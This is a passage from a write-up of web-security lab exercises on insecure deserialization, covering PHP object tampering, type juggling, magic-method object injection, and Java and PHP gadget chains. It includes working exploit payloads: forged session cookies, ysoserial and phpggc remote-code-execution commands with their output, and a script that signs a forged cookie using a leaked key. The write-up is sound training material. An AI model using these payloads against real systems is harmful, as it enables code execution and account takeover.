## Manipulating Serialized Objects

There are two approaches to manipulate serialized objects:
- Edit the object directly in its byte stream form.
- Write a short script to create and serialize new object yourself (easier when working with binary serialization formats).

### Modifying object attributes

As long as the attacker preserves a valid serialized object, the deserialization will create a server-side object with the modified attribute values.

For example, a website uses a serialized `User` object to store data about a user's session in a cookie.

If an attacker spots this serialized object in an HTTP request, they might decode it to find the following byte stream:

```json
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```

`isAdmin` can simply change the value to `1`, re-encode the object, and overwrite the cookie. 

#### Lab.1 - Modifying serialized objects

**Description**
The lab uses a serialization-based session mechanism vulnerable to privilege escalation as a result.

The goal of the lab is to edit the serialized object in the session cookie and gain administrative privileges, then delete the user `carlos`.

`wiener:peter` can be used to login.

**Solution**
I login to the lab with the `wiener:peter` credentials, and check the `GET` request to my account:

`GET /my-account?id=wiener HTTP/2`

There is also a Cooke, which I select, and check in the Inspector it's value decoded from `Base64.`

```http
GET /my-account?id=wiener HTTP/2
Host: 0af5008604b80d9b81ba752200ed0079.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
...
```

The decoded value is:

`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`

From this I see that the object `User` has a `username:wiener` and `admin:0`.

Let's change the `0` to `1` in the `admin` and encode this to `Base64`.

`Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=`

Send the request to the Repeater, and edit the request to `GET /admin` and replace the cookie with the modified one.

```http
GET /admin HTTP/2
Host: 0af5008604b80d9b81ba752200ed0079.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
...
```

And I see that I gained access to the `/admin` page where I see the `Carlos` account, and a link to delete it.

I put that to the `GET` request and the `Carlos` account is deleted, and the lab is solved.

-------

### Modifying data types

PHP is particularly vulnerable to this kind of manipulation because of its behavior of its comparison operator `==` when comparing different data types.

For example, if you perform a comparison between an integer and a string, PHP will attempt to convert the string to an integer, so `5 == "5"` evaluates to `true`.

This also works for any alphanumeric string that starts wit ha number, in this case PHP will convert the entire string to an integer value based on the initial number, and the rest of the string is ignored completely.

`5 == "5 something` is treated as `5 == 5`.

Also on PHP 7.x and earlier `0 == "something"` is `true` as the entire string is treated as the integer `0`.

If this loose operator is used in conjunction with user-controllable data from a deserialized object, can result in dangerous logic flaws.

```php
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
```

If the attacker modified the password attribute so that it contained the integer `0` instead of the expected string, as long as the password doesn't start with a number, it will always return `true`.

This is only possible because deserialization preservers the data type, and if the code fetched the password from the request directly, `0` would be converted to a string and it would be `false`.

#### Lab.2 Modifying serialized data types

**Description**
The lab has a serialization-based session mechanism vulnerable to authentication bypass. The goal of the lab is to edit the object in the session cookie to access the `administrator` and then delete the user `carlos`.

`wiener:peter` can be used to login.

**Solution**
I login to the account `wiener` and send the `GET /my-account?id=wiener` request to the Burp Repeater.

I select the session cookie and decode it from Base64 in Burp Inspector, the result is:

```json
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"lsjodtkf903odcg30lgt8p5gh0dzvre9";}
```

Here we want to change the account to `administrator` and change the data type of the access token to integer, since we want to put there a `0`.

In this case we change the `s` to `i`, remove the length of `32`, modify the length of username from `6` for `wiener` to `13` for `administrator`.

Also, put the 0 out of quotes, since it's not a string:

```json
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

The session cookie becomes: `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9`

And change the request to `GET /admin`. After we send the request we gain access to the admin panel, where we can see the link to delete the account `carlos`.

We send a request to this url, and the account is deleted, and the lab is solved.

--------

### Using App Functionality

Website functionality can also perform dangerous operations on data from a deserialized object.

So, you can use insecure deserialization to pass unexpected data.

An example can be that if a website `Delete user` function, the user's profile picture is deleted by accessing the file path in the `$user->image_location` attribute, and if the `$user` was created from a serialized object, the attacker can exploit this by passing a modified object in the `image_location`

#### Lab.4 Using app functionality to exploit insecure deserialization

**Description**
A feature invokes a dangerous method on data provided in a serialized object, and the goal to solve the lab is to delete the `morale.txt` from `Carlos's` home directory.

You can login via `wiener:peter`, and a backup account is `gregg:rosebud`.

**Solution**
I login via `wiener` account, and there are some functions, as for example to `delete account`.

After clicking on that, I got locked out, and the account is deleted. 

In Burp I see the request to delete the account `POST /my-account-delete`, and I send that to the Repeater.

In this request there is a session cookie `https://0a4e0069032c047f8092c6b2005b00c7.web-security-academy.net/`, which I decode from Base64 using Burp Inspector.

```json
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"xukoyvjjouap7qwb0bofk3n910xs9g1b";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

There, I see that there is also a function to delete the avatar, and provides the file path. 

So let's modify that to point to the `morale.txt` file and delete that.

Also, the length should be changed, and as the directory has a length of 23 that should be the number put there:

```json
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"xukoyvjjouap7qwb0bofk3n910xs9g1b";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

The session cookie becomes: `Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ4dWtveXZqam91YXA3cXdiMGJvZmszbjkxMHhzOWcxYiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9`.

The file is deleted and the lab is solved.

---------

### Magic Methods

Are a special subset of methods that you don't have to explicitly invoke. 

They are invoked automatically whenever a particular event or scenarrio occurs.

Sometimes they are indicated by surrounding the method name with double-underscores.

A common example in PHP is `__construct()`, that is invoked whenever an object of the class is instantiated, similar to Python's `__init__`.

Magic methods can be customized by devs to execute any code that they want.

They become dangerous when the code that they execute handles attacker-controllable data, for example, from a deserialized object.

Some languages, even have magic methods that are invoked automatically during the deserialization process. For example, PHP's `unserialize()` looks and invokes an objects `__wakeup()` magic method.

In Java the same applies to the `ObjectInputStream.readObject()` which is used to read data from the initial byte stream and acts like a constructor for "re-initializing" a serialized object.

However, `Serializable` classes can also declare their own `readObject()` method as follows:

```java
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
{
    // implementation
}
```

A `readObject()` method declared in this way acts as a magic method that is invoked during deserialization, and this allows the class to control the deserialization of its own fields more closely.

### Injecting Arbitrary Objects

In OOP the methods available to an object are determined by its class, so if an attacker can manipulate which class of object is passed in as serialized data they can influence what code is executed after, and even during, deserialization.

Since typically deserialization methods don't check what they are deserializing, it means that you can pass in objects of any serializable class available to the website, and the object will be deserialized.

This allows an attacker to create instances of arbitrary classes.

The unexpected object type can cause an exception in the app logic, but the malicious object will already be instantiated by then.

If an attacker has access to the source code, to construct an exploit, they would look for classes that contain deserialization magic methods, then check whether any of them perform dangerous operations on controllable data.

The attacker then can pass in a serialized object of this class to use its magic method for an exploit.

#### Lab.5 Arbitrary object injection in PHP

**Description**
The goal is to create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. 

For this access to the source code is needed. `wiener:peter` can be used to login to the lab.

**Solution**
I login to the site with the given credentials. 

In the `Site map` under the `libs` folder there is a php file `CustomTemplate.php`.

I've sent that request to the Burp Repeater, and sometimes appending the `~` you can view the contents of the file, as it retrieves an editor-generated backup file.

`GET /libs/CustomTemplate.php~ HTTP/2`

From this I got access to the source code of the php file:

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

Here In the end of the file there is the magic method `__destruct()` which is a modified version of destructor and deletes the file that is in the `lock_file_path`.

Now, let's use the serialized object when logging in, and modify that to put the `CustomTemplate` and provide with the `morale.txt` file as `lock_file_path`, so it would delete it.

The Base64-decoded session cookie is:

```json
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bzl7djm8rib8x3zknsdev0t0b3pydpxp";}
```

Now modify it in a way to replace the User with the CustomTemplate.

```json
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

So now, instead of `User` we put `CustomTemplate` and as the length is 14, we put that also.

Then, since we only want to delete the file with the `lock_file_path` we say that the `CustomTemplate` accepts one argument, and we put the length and the name of the function, and also the length and the name of the file that we want to delete.

After sending this request, the response is:

`HTTP/2 500 Internal Server Error`

```
PHP Fatal error:  Uncaught Exception: Invalid user  in /var/www/index.php:7
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 7
```

But, we also see that the lab is solved, since the file got deleted.

---------

## Gadget chains

Is a snippet of code that exists in the app that can help an attacker to achieve a particular goal.

A single gadget may not be directly harmful, but chaining multiple gadgets, an attacker can pass their input into a dangerous `sink gadget` and cause maximum damage.

Also, a gadget chain is not payload of chained methods constructed by the attacker, all of the code exists on the website.

The only thing the attacker controls is the data that is passed into the gadget. It's typically done using a magic method which is invoked during deserialization, called `kick-off gadget`.

Identifying gadget chains can be almost impossible without source code access, but there are options for working with the `pre-built gadget chains`.

`yoserial:`
Is a tool for Java deserialization, that lets you choose one of the provided gadget chains for a library that you think the target app is using.

Then you pass in a command that you want to execute. It creates an appropriate serialized object based on the selected chain.

It still involves a certain amount of trial and error, but is much easier than constructing the chains manually

#### Lab.6 - Exploiting Java deserialization with Apache Commons

**Description**
The lab uses a serialization-based session mechanism and loads the Apache Common Collections library.

There is no access to the source code, and the goal is to use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then pass. this to the website and delete the `morale.txt` from Carlos's home directory.

To the website it can be logged in via `wiener:peter`.

**Solution**

First lets install the `ysoserial` tool. For this I used the `wget` tool which which I downloaded `ysoserial`:

`wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar`

Then I logged in to the lab with the given credentials `wiener:peter` and sent the request to the Burp Repeater, in order to manipulate later the session cookie.

The command for `ysoserial` is a bit different for Java versions 16 and above

```shell
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > cookie.txt
```

This is a `Java` thing as the usual command would be: `java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > cookie.txt`

This created me a `cookie.txt` file with the serialized base64 session cookie to delete the `morale.txt` file.

```base64
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABrDK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAacm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXI3NjU1MjA3NDgwNzY3MTcBACBMeXNvc2VyaWFsL1B3bmVyNzY1NTIwNzQ4MDc2NzE3OwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AHwAAAdTK/rq+AAAAMgAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAEUHducnB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHcEAAAAA3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABcQB+ACl4
```

Now, copy that and put in the session cookie in the Burp Repeater and send the request.

The request had an error, saying `invalid handle value: 00400053`. 

Select the base64-encoded session cookie, right click and choose `Convert selection`, click on `URL`, and then `URL encode all characters`.

Send the request, and you get another error saying: `InstantiateTransformer: Constructor threw an exception`, but the code has been executed, the file deleted and the lab is solved.

--------

#### Lab.7 - PHP Generic Gadget Chains

**Description**
The lab has a serialization-based session mechanism that uses a signed cookie. 

It uses a common PHP framework. You don't have access to the source code, but it can be exploited using pre-built gadget chains.

The goal is to identify the target framework and then use a third-party tool to generate a malicious serialized object that contains a remote code execution payload.

The aim is to generate a valid signed cookie containing your malicious object, and pass this into the website to delete `morale.txt` from Carlos's home directory.

`wiener:peter` can be used to login

**Solution**
I login with the given credentials, and then send the request `GET /my-account?id=wiener` to the Repeater.

I highlight the session cookie, and in the Inspector, after decoded from URL, I see the following:

```json
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJnNnR3bXVhazNyMmtuejc5YTNkNm92bjIxdnBpdGMyNiI7fQ==","sig_hmac_sha1":"397e6d0b3e77fc9fb9ebd4aef0dd660a7a90fb00"}
```

Here it seems that it is SHA1 signed. 

Let's send this to the decoder, and base64 decode it. And the result is:

```json
{"token":"O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"g6twmuak3r2knz79a3d6ovn21vpitc26";}","sig_¬Üf¬ú_¬≤¬µ":"√ü√û√û√©√ù√ù√Æ√ª}√è_o√ó¬õw¬Ü¬ûG]√´¬≠√≠¬Øt}¬Ω4"}
```

Remove from the still encoded part the `sig_hmac_sha1` and the `token`:

```json
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"g6twmuak3r2knz79a3d6ovn21vpitc26";}
```

Let's try to access with the user `carlos`, by replacing `wiener`, and base64 encode it.
`Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJnNnR3bXVhazNyMmtuejc5YTNkNm92bjIxdnBpdGMyNiI7fQ==`

Now, in the Repeater, where it was URL-decoded, modify the base64 part, leaving the `sig_hmac_sha1` and `"token"` untouched.

I send the request, and it seems that I can't get access. There is an error which discloses the framework.

![Pasted_image_20250127161910](https://github.com/user-attachments/assets/5f4a6bb9-1551-4728-806f-19ff7fe22c5c)

Now let's try to find the secret key, which can be in the `phpinfo()`. 

I find the location where it is accessible by first looking for the dev comments in the code.

This is done by going to the `Target` and by right-clicking on it, choose the `Engagement Tools` and `Find comment`.

In the root endpoint there is a comment, which shows the location for the `phpinfo()`.

```html
<a href=/cgi-bin/phpinfo.php>Debug</a>
```

We send a `GET` request there, and find the secret key:

![Pasted_image_20250127162502](https://github.com/user-attachments/assets/d34a72bb-9bc1-4760-85d9-2950e04086d9)

`SECRET_KEY	nr34j2tfxgavfsg3akm15hvpl8nlzb6d`

This will allow us to sign the cookie session. I will create it by using the `phpggc` tool:

First clone the repo:

`git clone https://github.com/ambionics/phpggc`

Now, let's enumerate the framework, and find the ones for `Symfony`.

```bash
./phpggc -l | grep Symfony
```

And the result is:

```bash
Symfony/FD1                               v3.2.7 <= v3.4.25 v4.0.0 <= v4.1.11 v4.2.0 <= v4.2.6    File delete               __destruct
Symfony/FW1                               2.5.2                                                   File write                DebugImport     *
Symfony/FW2                               3.4                                                     File write                __destruct
Symfony/RCE1                              v3.1.0 <= v3.4.34                                       RCE: Command              __destruct      *
Symfony/RCE2                              2.3.42 < 2.6                                            RCE: PHP Code             __destruct      *
Symfony/RCE3                              2.6 <= 2.8.32                                           RCE: PHP Code             __destruct      *
Symfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7                             RCE: Function Call        __destruct      *
Symfony/RCE5                              5.2.*                                                   RCE: Function Call        __destruct
Symfony/RCE6                              v3.4.0-BETA4 <= v3.4.49 & v4.0.0-BETA4 <= v4.1.13       RCE: Command              __destruct      *
Symfony/RCE7                              v3.2.0 <= v3.4.34 v4.0.0 <= v4.2.11 v4.3.0 <= v4.3.7    RCE: Function Call        __destruct
Symfony/RCE8                              v3.4.0 <= v4.4.18 v5.0.0 <= v5.2.1                      RCE: Function Call        __destruct
Symfony/RCE9                              2.6.0 <= 4.4.18                                         RCE: Function Call        __destruct
Symfony/RCE10                             2.0.4 <= 5.4.24 (all)                                   RCE: Function Call        __toString
Symfony/RCE11                             2.0.4 <= 5.4.24 (all)                                   RCE: Function Call        __destruct
Symfony/RCE12                             1.3.0 <= 1.5.13~17                                      RCE: Function Call        __destruct      *
Symfony/RCE13                             1.2.0 <= 1.2.12                                         RCE: Function Call        Serializable    *
Symfony/RCE14                             1.2.0 <= 1.2.12                                         RCE: Function Call        __wakeup        *
Symfony/RCE15                             1.0.0 <= 1.1.9                                          RCE: Function Call        __wakeup        *
Symfony/RCE16                             1.1.0 <= 1.5.18                                         RCE: Function Call        Serializable    *
```

I see that `Symfony/RCE 4` covers our version `4.3.6`:

```bash
Symfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7
```

Now I will create an object which will perform the action that we need to solve the lab, which is:

`exec 'rm /home/carlos/morale.txt'`

So, by running the command:

```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt'
```

The result is:

```bash
O:47:"Symfony\Component\Cache\Adapter\TagAwareAdapter":2:{s:57:"Symfony\Component\Cache\Adapter\TagAwareAdapterdeferred";a:1:{i:0;O:33:"Symfony\Component\Cache\CacheItem":2:{s:11:"*poolHash";i:1;s:12:"*innerItem";s:26:"rm /home/carlos/morale.txt";}}s:53:"Symfony\Component\Cache\Adapter\TagAwareAdapterpool";O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"Symfony\Component\Cache\Adapter\ProxyAdapterpoolHash";i:1;s:58:"Symfony\Component\Cache\Adapter\ProxyAdaptersetInnerItem";s:4:"exec";}}
```

Convert it to base64, and it is:

```base64
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
```

Now we need to sign it using the secret key we got before.

I ran the following  php script:

```php
<?php
$obj = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secret = "nr34j2tfxgavfsg3akm15hvpl8nlzb6d";
$cookie = urlencode('{"token":"' . $obj . '","sig_hmac_sha1":"' . hash_hmac('sha1', $obj, $secret) . '"}');
echo $cookie;
```

And it produced the signed cookie:
